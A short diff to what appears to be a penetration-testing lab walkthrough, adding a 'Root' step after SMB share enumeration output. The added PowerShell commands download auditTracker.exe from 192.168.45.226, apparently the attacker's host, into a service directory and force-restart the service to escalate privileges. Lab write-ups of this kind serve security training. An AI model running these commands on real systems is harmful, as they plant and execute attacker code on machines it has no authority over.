@@ -261,3 +261,8 @@ SMB         172.16.184.83   445    CLIENT02         Windows         READ
     ```
 
 ## Root
+1.  ```
+    cd C:\DevelopmentExecutables
+    iwr -uri http://192.168.45.226/auditTracker.exe -Outfile auditTracker.exe 
+    Restart-Service auditTracker.exe -Force 
+    ```
